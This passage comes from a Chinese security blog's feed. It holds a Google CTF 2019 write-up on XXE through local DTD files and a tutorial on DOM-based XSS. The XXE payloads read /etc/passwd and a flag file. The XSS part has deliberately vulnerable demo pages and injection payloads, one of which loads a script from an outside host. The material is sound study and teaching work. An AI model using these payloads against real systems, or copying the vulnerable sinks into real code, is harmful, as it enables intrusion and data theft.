    <content type="html"><![CDATA[<h2 id="0x01-利用本地DTD文件实现XXE攻击"><a href="#0x01-利用本地DTD文件实现XXE攻击" class="headerlink" title="0x01 利用本地DTD文件实现XXE攻击"></a>0x01 利用本地DTD文件实现XXE攻击</h2><p>一般来说，对于无回显的支持外部实体的XXE，是通过带外通道OOB实现攻击回传数据。</p><p>但是，当你的服务器和目标服务器之间有防火墙时，上面的方法就没辙了。此时我们就可以通过本地DTD文件利用XXE漏洞实现任意结果的输出。</p><h3 id="内部DTD文件可干啥？"><a href="#内部DTD文件可干啥？" class="headerlink" title="内部DTD文件可干啥？"></a>内部DTD文件可干啥？</h3><p>要想在内部DTD子集中使用外部DTD语法，你可以在目标主机上强制执行本地DTD文件，并在其中重新定义一些参数实体引用：</p><p><strong>Request</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % condition &apos;aaa)&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">        &lt;!ELEMENT aa (bb&apos;&gt;</span><br><span class="line"></span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong>sip-app_1_0.dtd 中的内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">…</span><br><span class="line">&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;</span><br><span class="line">&lt;!ELEMENT pattern (%condition;)&gt;</span><br><span class="line">…</span><br></pre></td></tr></table></figure><p>它起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体则仅使用第一个实体。</p><h3 id="内部DTD文件合集"><a href="#内部DTD文件合集" class="headerlink" title="内部DTD文件合集"></a>内部DTD文件合集</h3><p>通过枚举来查找文件和目录应该是最简单的方法了，以下是一些成功应用此技巧的例子：</p><p><strong>Linux</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &apos;Your DTD code&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>Windows</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % SuperClass &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p>感谢来自Positive Technologies的@Mike_n1分享的这条始终存在的Windows DTD文件路径。</p><p><strong>Cisco WebEx</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % url.attribute.set &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>Citrix XenMobile Server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % Body &apos;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&apos;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><p><strong>多平台 IBM WebSphere 应用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;./../../properties/schemas/j2ee/XMLSchema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xs-datatypes &apos;Your DTD code&apos;&gt;</span><br><span class="line">&lt;!ENTITY % simpleType &quot;a&quot;&gt;</span><br><span class="line">&lt;!ENTITY % restriction &quot;b&quot;&gt;</span><br><span class="line">&lt;!ENTITY % boolean &quot;(c)&quot;&gt;</span><br><span class="line">&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure><h2 id="0x02-Google-CTF-2019-bnv"><a href="#0x02-Google-CTF-2019-bnv" class="headerlink" title="0x02 Google CTF 2019 bnv"></a>0x02 Google CTF 2019 bnv</h2><p>题目地址：<a href="http://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">http://bnv.web.ctfcompetition.com/</a></p><p>访问页面，有个选项框让你选择，然后返回该地址的一些信息：</p><p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/1.png" alt=""></p><p>查看源码，发现有个post.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AjaxFormPost</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> datasend;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="built_in">document</span>.getElementById(<span class="string">'message'</span>).value;</span><br><span class="line">  message = message.toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> blindvalues = [</span><br><span class="line">    <span class="string">'10'</span>,    <span class="string">'120'</span>,   <span class="string">'140'</span>,    <span class="string">'1450'</span>,   <span class="string">'150'</span>,   <span class="string">'1240'</span>,  <span class="string">'12450'</span>,</span><br><span class="line">    <span class="string">'1250'</span>,  <span class="string">'240'</span>,   <span class="string">'2450'</span>,   <span class="string">'130'</span>,    <span class="string">'1230'</span>,  <span class="string">'1340'</span>,  <span class="string">'13450'</span>,</span><br><span class="line">    <span class="string">'1350'</span>,  <span class="string">'12340'</span>, <span class="string">'123450'</span>, <span class="string">'12350'</span>,  <span class="string">'2340'</span>,  <span class="string">'23450'</span>, <span class="string">'1360'</span>,</span><br><span class="line">    <span class="string">'12360'</span>, <span class="string">'24560'</span>, <span class="string">'13460'</span>,  <span class="string">'134560'</span>, <span class="string">'13560'</span>,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> blindmap = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">var</span> i;</span><br><span class="line">  <span class="keyword">var</span> message_new = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; blindvalues.length; i++) &#123;</span><br><span class="line">    blindmap[i + <span class="number">97</span>] = blindvalues[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; message.length; i++) &#123;</span><br><span class="line">    message_new += blindmap[(message[i].charCodeAt(<span class="number">0</span>))];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  datasend = <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">    <span class="string">'message'</span>: message_new,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'/api/search'</span>;</span><br><span class="line">  xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">'POST'</span>, url, <span class="literal">true</span>);</span><br><span class="line">  xhr.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/json'</span>);</span><br><span class="line"></span><br><span class="line">  xhr.onreadystatechange =</span><br><span class="line">      <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.getResponseHeader(<span class="string">'Content-Type'</span>));</span><br><span class="line">        <span class="keyword">if</span> (xhr.getResponseHeader(<span class="string">'Content-Type'</span>) == <span class="string">"application/json; charset=utf-8"</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> json = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'database-data'</span>).value = json[<span class="string">'ValueSearch'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(e) &#123;;</span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'database-data'</span>).value = e.message;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">'database-data'</span>).value = xhr.responseText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      xhr.send(datasend);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要功能就是将输入的内容转换成ASCII码，然后再到blindvalues的数组（数组大小为26）中寻找并替换，在此之前blindvalues的下标加了97，也就是说，我们输入的json的参数内容只能限定在26个字母中，这样就没法往下利用，点不在这。</p><p>没啥其他提示，看下报文，都是Json格式：</p><p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/2.png" alt=""></p><p>根据参考文章提示，Content-Type为application/json并使用Json进行数据交互的Web站点，可以修改其Content-Type为application/xml，并尝试进行XXE注入。</p><p>先修改Content-Type为application/xml，发现响应包返回没有找到开启的标签符\&lt;，也就是明确是是可以解析XML格式数据的：</p><p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/3.png" alt=""></p><p>修改Json格式数据为XML格式数据，提示找不到DTD：</p><p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/4.png" alt=""></p><p>下面直接用内部DTD文件实现回显利用，先发送WebSphere测试下：</p><p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/5.png" alt=""></p><p>报错，找不到该内部DTD文件，而目标系统是Linux，直接换Linux的payload就好：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &apos;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&apos;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">&lt;message&gt;any text&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>访问flag文件即可得到flag：</p><p><img src="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/6.png" alt=""></p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">Exploiting XXE with local DTD files</a></p><p><a href="https://blog.netspi.com/playing-content-type-xxe-json-endpoints/" target="_blank" rel="noopener">Playing with Content-Type – XXE on JSON Endpoints</a></p><p><a href="https://www.freebuf.com/articles/web/195899.html" target="_blank" rel="noopener">使用本地DTD文件来利用XXE漏洞实现任意结果输出</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XML注入" scheme="https://Mi1k7ea.github.com/tags/XML%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析DOM型XSS</title>
    <link href="https://Mi1k7ea.github.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/"/>
    <id>https://Mi1k7ea.github.com/2019/06/25/浅析DOM型XSS/</id>
    <published>2019-06-25T13:56:15.000Z</published>
    <updated>2019-07-21T09:35:41.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-DOM简介"><a href="#0x01-DOM简介" class="headerlink" title="0x01 DOM简介"></a>0x01 DOM简介</h2><p>DOM（Document Object Model）即文档对象模型，是HTML和XML文档的编程接口。</p><p>其中HTML DOM定义了所有HTML元素的对象和属性，以及访问它们的方法。换言之，HTML DOM是关于如何获取、修改、添加或删除HTML元素的标准。</p><p>DOM以树结构表达HTML文档。</p><p>下图为HTML DOM树形结构示例：</p><p><img src="/2019/06/25/浅析DOM型XSS/7.png" alt=""></p><h2 id="0x02-DOM型XSS"><a href="#0x02-DOM型XSS" class="headerlink" title="0x02 DOM型XSS"></a>0x02 DOM型XSS</h2><p>…</p><h2 id="0x03-几种常见场景"><a href="#0x03-几种常见场景" class="headerlink" title="0x03 几种常见场景"></a>0x03 几种常见场景</h2><p>下面将一些遇到的题目案例做个简单的归纳，小结下常见的几种DOM型XSS场景。</p><h3 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h3><p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。当其作为可控参数传入eval()时则会存在DOM型XSS漏洞。</p><p>dom_xss.php，eval()执行location.hash提取出来的内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSdemo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">eval</span>(<span class="built_in">decodeURI</span>(location.hash.substr(<span class="number">1</span>)))</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>根据location.hash属性，在URL栏输入如下内容尝试往页面写入恶意js代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#document.write(&quot;&lt;script&gt;alert(&apos;hacked by mi1k7ea&apos;)&lt;/script&gt;&quot;)</span><br></pre></td></tr></table></figure><p>在Chrome下会被拦截，因为Chrome自带的XSS过滤机制：</p><p><img src="/2019/06/25/浅析DOM型XSS/1.png" alt=""></p><p>放到Firefox中是没问题的：</p><p><img src="/2019/06/25/浅析DOM型XSS/2.png" alt=""></p><p>为了使Chrome下也生效，我们在自己的服务端放置一个恶意JS文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"Hacked by Mi1k7ea :) "</span>)</span><br></pre></td></tr></table></figure><p>然后改下poc远程加载恶意JS即可在Chrome上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#document.write(&quot;&lt;script/src=http://a.com/7ea.js&gt;&lt;/script&gt;&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2019/06/25/浅析DOM型XSS/3.png" alt=""></p><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>innerHTML 属性设置或返回表格行的开始和结束标签之间的 HTML。</p><p><strong>注意：innerHTML中嵌入script标签是不会执行JS代码的，可以使用img等标签替代。</strong></p><p>案例源自：<a href="https://brutelogic.com.br/tests/sinks.html" target="_blank" rel="noopener">https://brutelogic.com.br/tests/sinks.html</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>Hello, guest!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> currentSearch = <span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> searchParams = <span class="keyword">new</span> URLSearchParams(currentSearch);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">/*** Document Sink ***/</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> username = searchParams.get(<span class="string">'name'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (username !== <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'p1'</span>).innerHTML = <span class="string">'Hello, '</span> + username + <span class="string">'!'</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>通过document.location.search获取当前 URL 的查询部分（问号 ? 之后的部分）；然后获取其中的name参数，若name参数不为空则通过innerHTML嵌入到页面中。</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;img%20src=x%20onerror=alert(/dom/)&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/25/浅析DOM型XSS/4.png" alt=""></p><h3 id="location"><a href="#location" class="headerlink" title="location"></a>location</h3><p>location指示了其所连接对象的url位置。Document和window对象中都有location属性，可以通过window.location和document.location访问。</p><p>案例源自：<a href="https://brutelogic.com.br/tests/sinks.html" target="_blank" rel="noopener">https://brutelogic.com.br/tests/sinks.html</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>Hello, guest!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> currentSearch = <span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> searchParams = <span class="keyword">new</span> URLSearchParams(currentSearch);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">/*** Location Sink ***/</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> redir = searchParams.get(<span class="string">'redir'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (redir !== <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.location = redir;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从URL栏获取redir参数，判断不为空则赋值给document.location。而document.location会是页面跳转到输入的新的URL位置即更换访问的URL路径。此时可通过js伪协议实现DOM型XSS攻击。</p><p>payload如下，直接通过javascript伪协议实现XSS注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redir=javascript:alert(/dom/)</span><br></pre></td></tr></table></figure><p><img src="/2019/06/25/浅析DOM型XSS/5.png" alt=""></p><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>eval() 函数计算 JavaScript 字符串，并把它作为脚本代码来执行。</p><p>案例源自：<a href="https://brutelogic.com.br/tests/sinks.html" target="_blank" rel="noopener">https://brutelogic.com.br/tests/sinks.html</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span>Hello, guest!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> currentSearch = <span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> searchParams = <span class="keyword">new</span> URLSearchParams(currentSearch);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">/*** Execution Sink ***/</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> nasdaq = <span class="string">'AAAA'</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> dowjones = <span class="string">'BBBB'</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> sp500 = <span class="string">'CCCC'</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> market = [];</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> index = searchParams.get(<span class="string">'index'</span>).toString();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="string">'market.index='</span> + index);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'p1'</span>).innerHTML = <span class="string">'Current market index is '</span> + market.index + <span class="string">'.'</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里获取URL栏的index值，然后调用eval()将该值赋给market.index，最后通过innerHTML将market.index的值输出到页面中。</p><p>本段代码问题在于参数index是直接传入eval()中，并未经过任何过滤，因此可直接输入恶意JS语句造成DOM型XSS。payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?index=alert(/7ea/)</span><br></pre></td></tr></table></figure><p><img src="/2019/06/25/浅析DOM型XSS/6.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>PHP弱类型及相关函数Bypass小结</title>
